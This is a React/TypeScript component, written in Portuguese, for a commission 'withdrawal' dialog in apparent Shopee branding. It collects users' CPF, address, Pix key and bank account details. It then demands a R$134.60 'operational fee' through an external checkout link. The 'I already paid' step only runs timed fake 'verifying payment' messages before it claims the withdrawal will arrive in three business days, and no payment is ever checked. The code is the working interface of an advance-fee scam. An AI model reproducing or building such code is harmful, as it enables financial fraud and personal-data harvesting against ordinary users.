import { useEffect, useMemo, useState } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "../ui/dialog";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Label } from "../ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../ui/select";
import { useApp } from "../../lib/state";
import { brl } from "../../lib/format";
import { toast } from "sonner";
import { Wallet, CheckCircle2, Loader2, ExternalLink, AlertCircle } from "lucide-react";

// ── Configuração ────────────────────────────────────────────────────────────
const WITHDRAWAL_FEE_CHECKOUT_URL = "https://go.ironpayapp.com.br/k32yu4hx10";
const FEE_AMOUNT = 134.6;
const ELIGIBLE_MIN = 5000;
// ───────────────────────────────────────────────────────────────────────────

function useWithdrawableBalance() {
  const { getCommissionSum } = useApp();
  return getCommissionSum("shopee", "30d");
}

type Step = "form" | "review" | "fee" | "loading" | "success";

export function WithdrawalDialog({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (b: boolean) => void;
}) {
  const { submitWithdrawalRequest } = useApp();
  const balance = useWithdrawableBalance();
  const [step, setStep] = useState<Step>("form");
  const [loadingPhase, setLoadingPhase] = useState(0);
  // "Já paguei" só aparece depois que o usuário clicou em pagar e voltou ao site
  const [checkoutOpened, setCheckoutOpened] = useState(false);
  const [returnedFromCheckout, setReturnedFromCheckout] = useState(false);

  // Form fields
  const [fullName, setFullName] = useState("");
  const [cpf, setCpf] = useState("");
  const [cnpj, setCnpj] = useState("");
  const [address, setAddress] = useState("");
  const [pixKey, setPixKey] = useState("");
  const [pixKeyType, setPixKeyType] = useState("CPF");
  const [bankName, setBankName] = useState("");
  const [agency, setAgency] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [accountType, setAccountType] = useState("Corrente");
  const [amount, setAmount] = useState("");

  const amountNum = useMemo(
    () => Number(String(amount).replace(/\./g, "").replace(",", ".")) || 0,
    [amount],
  );

  const checkoutConfigured =
    (WITHDRAWAL_FEE_CHECKOUT_URL as string) !== "INSERIR_LINK_DO_CHECKOUT_AQUI" &&
    (WITHDRAWAL_FEE_CHECKOUT_URL as string).startsWith("http");

  const reset = () => {
    setStep("form");
    setLoadingPhase(0);
    setCheckoutOpened(false);
    setReturnedFromCheckout(false);
    setFullName(""); setCpf(""); setCnpj(""); setAddress("");
    setPixKey(""); setPixKeyType("CPF");
    setBankName(""); setAgency(""); setAccountNumber(""); setAccountType("Corrente");
    setAmount("");
  };

  const close = (v: boolean) => {
    if (!v) reset();
    onOpenChange(v);
  };

  // ── Step transitions ──────────────────────────────────────────────────────
  const goReview = () => {
    if (!fullName.trim()) { toast.error("Informe o nome completo."); return; }
    if (!cpf.trim()) { toast.error("Informe o CPF."); return; }
    if (!address.trim()) { toast.error("Informe o endereço completo."); return; }
    if (!pixKey.trim()) { toast.error("Informe a chave Pix."); return; }
    if (!bankName.trim()) { toast.error("Informe o banco."); return; }
    if (!accountNumber.trim()) { toast.error("Informe a conta."); return; }
    if (!(amountNum > 0)) { toast.error("Informe um valor válido."); return; }
    if (amountNum > balance) { toast.error(`Valor não pode exceder ${brl(balance)}.`); return; }
    setStep("review");
  };

  const goFee = () => setStep("fee");

  const openCheckout = () => {
    if (!checkoutConfigured) return;
    window.open(WITHDRAWAL_FEE_CHECKOUT_URL, "_blank", "noopener,noreferrer");
    setCheckoutOpened(true);
    // Detecta quando o usuário volta à aba após ir ao checkout
    const onVisible = () => {
      if (document.visibilityState === "visible") {
        setReturnedFromCheckout(true);
        document.removeEventListener("visibilitychange", onVisible);
      }
    };
    document.addEventListener("visibilitychange", onVisible);
  };

  const handleAlreadyPaid = async () => {
    setStep("loading");
    setLoadingPhase(0);
    // Phase 0 → "Verificando pagamento..." (1.5 s)
    await new Promise((r) => setTimeout(r, 1500));
    setLoadingPhase(1);
    // Phase 1 → "Processando solicitação de saque..." (2 s)
    await new Promise((r) => setTimeout(r, 2000));
    // Submit record to Supabase (best-effort)
    await submitWithdrawalRequest(amountNum, pixKey.trim(), pixKeyType, fullName.trim());
    setStep("success");
  };

  // Auto-close on success after 10 s if user doesn't close manually
  useEffect(() => {
    if (step !== "success") return;
    const t = setTimeout(() => { reset(); onOpenChange(false); }, 10000);
    return () => clearTimeout(t);
  }, [step]);

  // ── Loading phase labels ──────────────────────────────────────────────────
  const loadingLabels = [
    "Verificando pagamento...",
    "Processando solicitação de saque...",
  ];

  // ── Dialog title by step ──────────────────────────────────────────────────
  const dialogTitle: Record<Step, string> = {
    form: "Solicitar saque",
    review: "Confirmar solicitação de saque",
    fee: "Taxa operacional de processamento",
    loading: "Aguarde",
    success: "Solicitação enviada",
  };

  return (
    <Dialog open={open} onOpenChange={close}>
      <DialogContent className="max-w-xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            {step === "success" ? (
              <CheckCircle2 className="h-5 w-5 text-emerald-500" />
            ) : (
              <Wallet className="h-5 w-5 text-[#EE4D2D]" />
            )}
            {dialogTitle[step]}
          </DialogTitle>
          {step === "form" && (
            <DialogDescription>
              Saldo disponível para saque: {brl(balance)}.
            </DialogDescription>
          )}
          {step === "review" && (
            <DialogDescription>
              Confira os dados antes de confirmar a solicitação.
            </DialogDescription>
          )}
        </DialogHeader>

        {/* ── STEP: FORM ──────────────────────────────────────────────── */}
        {step === "form" && (
          <div className="grid gap-3 sm:grid-cols-2">
            <Field label="Nome completo *" className="sm:col-span-2">
              <Input value={fullName} onChange={(e) => setFullName(e.target.value)} />
            </Field>
            <Field label="CPF *">
              <Input value={cpf} onChange={(e) => setCpf(e.target.value)} placeholder="000.000.000-00" />
            </Field>
            <Field label="CNPJ (opcional)">
              <Input value={cnpj} onChange={(e) => setCnpj(e.target.value)} placeholder="00.000.000/0000-00" />
            </Field>
            <Field label="Endereço completo *" className="sm:col-span-2">
              <Input value={address} onChange={(e) => setAddress(e.target.value)} placeholder="Rua, número, bairro, cidade/UF, CEP" />
            </Field>
            <Field label="Tipo da chave Pix *">
              <Select value={pixKeyType} onValueChange={setPixKeyType}>
                <SelectTrigger><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="CPF">CPF</SelectItem>
                  <SelectItem value="CNPJ">CNPJ</SelectItem>
                  <SelectItem value="Email">E-mail</SelectItem>
                  <SelectItem value="Telefone">Telefone</SelectItem>
                  <SelectItem value="Aleatoria">Aleatória</SelectItem>
                </SelectContent>
              </Select>
            </Field>
            <Field label="Chave Pix *">
              <Input value={pixKey} onChange={(e) => setPixKey(e.target.value)} />
            </Field>
            <Field label="Banco *">
              <Input value={bankName} onChange={(e) => setBankName(e.target.value)} placeholder="Ex.: Nubank" />
            </Field>
            <Field label="Agência (opcional)">
              <Input value={agency} onChange={(e) => setAgency(e.target.value)} />
            </Field>
            <Field label="Conta *">
              <Input value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} />
            </Field>
            <Field label="Tipo de conta *">
              <Select value={accountType} onValueChange={setAccountType}>
                <SelectTrigger><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="Corrente">Corrente</SelectItem>
                  <SelectItem value="Poupança">Poupança</SelectItem>
                  <SelectItem value="Pagamento">Pagamento</SelectItem>
                </SelectContent>
              </Select>
            </Field>
            <Field label={`Valor solicitado (máx. ${brl(balance)}) *`} className="sm:col-span-2">
              <Input value={amount} onChange={(e) => setAmount(e.target.value)} inputMode="decimal" placeholder="0,00" />
            </Field>
          </div>
        )}

        {/* ── STEP: REVIEW ────────────────────────────────────────────── */}
        {step === "review" && (
          <div className="space-y-2 rounded-lg border border-border bg-background/40 p-4 text-sm">
            <ReviewRow label="Nome" value={fullName} />
            <ReviewRow label="CPF" value={cpf} />
            {cnpj && <ReviewRow label="CNPJ" value={cnpj} />}
            <ReviewRow label="Endereço" value={address} />
            <ReviewRow label="Chave Pix" value={`${pixKey} (${pixKeyType})`} />
            <ReviewRow label="Banco" value={bankName} />
            <ReviewRow label="Conta" value={`${agency ? agency + " / " : ""}${accountNumber} • ${accountType}`} />
            <div className="my-1 h-px bg-border" />
            <ReviewRow label="Valor solicitado" value={brl(amountNum)} highlight />
          </div>
        )}

        {/* ── STEP: FEE ───────────────────────────────────────────────── */}
        {step === "fee" && (
          <div className="space-y-5">
            <p className="text-sm text-muted-foreground leading-relaxed">
              Para concluir a solicitação de saque, é necessário realizar o pagamento da taxa operacional de processamento. Após a confirmação, sua solicitação seguirá para processamento.
            </p>

            <div className="rounded-xl border border-border bg-card p-5 text-center">
              <div className="text-xs uppercase tracking-widest text-muted-foreground">Valor da taxa</div>
              <div className="mt-1 text-3xl font-bold text-[#EE4D2D]">{brl(FEE_AMOUNT)}</div>
              <div className="mt-1 text-xs text-muted-foreground">Taxa operacional de processamento</div>
            </div>

            {!checkoutConfigured && (
              <div className="flex items-center gap-2 rounded-md border border-amber-300 bg-amber-50 px-3 py-2.5 text-sm text-amber-700">
                <AlertCircle className="h-4 w-4 shrink-0" />
                Checkout ainda não configurado.
              </div>
            )}

            <div className="space-y-2">
              <Button
                className="w-full bg-[#EE4D2D] text-white hover:bg-[#d8431f]"
                disabled={!checkoutConfigured}
                onClick={openCheckout}
              >
                <ExternalLink className="mr-2 h-4 w-4" />
                {checkoutOpened ? "Abrir checkout novamente" : "Pagar taxa operacional"}
              </Button>

              {/* "Já paguei" só aparece depois que o usuário foi ao checkout E voltou */}
              {checkoutOpened && !returnedFromCheckout && (
                <p className="text-center text-xs text-muted-foreground animate-pulse">
                  Aguardando retorno do checkout...
                </p>
              )}
              {returnedFromCheckout && (
                <Button
                  variant="outline"
                  className="w-full"
                  onClick={handleAlreadyPaid}
                >
                  Já paguei
                </Button>
              )}
            </div>
          </div>
        )}

        {/* ── STEP: LOADING ───────────────────────────────────────────── */}
        {step === "loading" && (
          <div className="flex flex-col items-center gap-5 py-8">
            <div className="relative grid h-16 w-16 place-items-center rounded-full bg-primary/10">
              <Loader2 className="h-8 w-8 animate-spin text-[#EE4D2D]" />
            </div>
            <div className="text-center">
              <p className="text-base font-semibold">{loadingLabels[loadingPhase]}</p>
              <p className="mt-1 text-xs text-muted-foreground">Por favor, aguarde...</p>
            </div>
            <div className="flex gap-1.5">
              {loadingLabels.map((_, i) => (
                <div
                  key={i}
                  className={`h-1.5 w-8 rounded-full transition-all duration-500 ${i <= loadingPhase ? "bg-[#EE4D2D]" : "bg-border"}`}
                />
              ))}
            </div>
          </div>
        )}

        {/* ── STEP: SUCCESS ───────────────────────────────────────────── */}
        {step === "success" && (
          <div className="flex flex-col items-center gap-5 py-6 text-center">
            <div className="grid h-16 w-16 place-items-center rounded-full bg-emerald-500/10">
              <CheckCircle2 className="h-9 w-9 text-emerald-500" />
            </div>
            <div>
              <p className="text-base font-semibold text-foreground">
                Solicitação enviada com sucesso!
              </p>
              <p className="mt-2 max-w-xs text-sm text-muted-foreground">
                Seu saque está sendo processado e cairá em até{" "}
                <span className="font-semibold text-foreground">3 dias úteis</span>.
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background/60 px-4 py-3 text-xs text-muted-foreground">
              Valor solicitado:{" "}
              <span className="font-bold text-[#EE4D2D]">{brl(amountNum)}</span>
            </div>
          </div>
        )}

        {/* ── FOOTER BUTTONS ──────────────────────────────────────────── */}
        {step !== "fee" && step !== "loading" && step !== "success" && (
          <DialogFooter>
            {step === "form" && (
              <>
                <Button variant="outline" onClick={() => close(false)}>Cancelar</Button>
                <Button onClick={goReview} className="bg-[#EE4D2D] text-white hover:bg-[#d8431f]">
                  Continuar
                </Button>
              </>
            )}
            {step === "review" && (
              <>
                <Button variant="outline" onClick={() => setStep("form")}>Voltar</Button>
                <Button onClick={goFee} className="bg-[#EE4D2D] text-white hover:bg-[#d8431f]">
                  Confirmar solicitação
                </Button>
              </>
            )}
          </DialogFooter>
        )}

        {step === "success" && (
          <DialogFooter>
            <Button onClick={() => { reset(); onOpenChange(false); }} className="w-full">
              Fechar
            </Button>
          </DialogFooter>
        )}
      </DialogContent>
    </Dialog>
  );
}

// ── Sub-components ──────────────────────────────────────────────────────────
function Field({ label, children, className }: { label: string; children: React.ReactNode; className?: string }) {
  return (
    <div className={"space-y-1.5 " + (className ?? "")}>
      <Label className="text-xs text-muted-foreground">{label}</Label>
      {children}
    </div>
  );
}

function ReviewRow({ label, value, highlight }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div className="flex items-start justify-between gap-3">
      <span className="text-xs uppercase tracking-wide text-muted-foreground">{label}</span>
      <span className={"text-right " + (highlight ? "text-base font-bold text-[#EE4D2D]" : "font-medium text-foreground")}>
        {value}
      </span>
    </div>
  );
}

// ── Helpers ───────────────────────────────────────────────────────────────────
/** Verifica se agora é sexta-feira a partir das 13h no horário de São Paulo */
function isFridayAfter13hSP(): boolean {
  const spDate = new Date(
    new Date().toLocaleString("en-US", { timeZone: "America/Sao_Paulo" })
  );
  return spDate.getDay() === 5 && spDate.getHours() >= 13;
}

// ── WithdrawalButton ─────────────────────────────────────────────────────────
export function WithdrawalButton({ className }: { className?: string }) {
  const balance = useWithdrawableBalance();
  const { isAdmin } = useApp();
  const [open, setOpen] = useState(false);

  const balanceOk = balance >= ELIGIBLE_MIN;
  const fridayOk  = isFridayAfter13hSP();

  // Admins: sempre habilitado (para testes)
  // Usuários normais: precisa ter R$ 5.000+ E ser sexta a partir das 13h SP
  const eligible = isAdmin || (balanceOk && fridayOk);

  // Mensagem de status para usuários não-admin
  const statusMsg = (() => {
    if (isAdmin || eligible) return null;
    if (!balanceOk && !fridayOk)
      return "Disponível toda sexta às 13h ao atingir R$ 5.000,00 em comissões.";
    if (!balanceOk)
      return `Saldo insuficiente — mínimo R$ 5.000,00 (atual: R$ ${balance.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}).`;
    // balanceOk mas não é sexta 13h
    return "Saque indisponível — liberado somente na sexta-feira às 13h.";
  })();

  return (
    <div className={"flex flex-col items-center gap-1 " + (className ?? "")}>
      <button
        type="button"
        onClick={() => eligible && setOpen(true)}
        disabled={!eligible}
        title={eligible ? "Sacar na próxima sexta-feira às 13h" : (statusMsg ?? "")}
        className={
          "inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm font-semibold transition " +
          (eligible
            ? "bg-[#EE4D2D] text-white shadow hover:bg-[#d8431f]"
            : "cursor-not-allowed bg-muted text-muted-foreground")
        }
      >
        <Wallet className="h-4 w-4" />
        {eligible ? "Sacar" : "Saque indisponível"}
      </button>

      {eligible && (
        <>
          <span className="text-[11px] font-semibold text-[#EE4D2D]">
            Sacar na próxima sexta-feira às 13h
          </span>
          <span className="text-[10px] text-muted-foreground">
            Disponível toda sexta-feira a partir das 13h.
          </span>
        </>
      )}

      {!eligible && statusMsg && (
        <span className="text-[10px] text-muted-foreground text-center max-w-[220px] leading-snug">
          {statusMsg}
        </span>
      )}

      {eligible && <WithdrawalDialog open={open} onOpenChange={setOpen} />}
    </div>
  );
}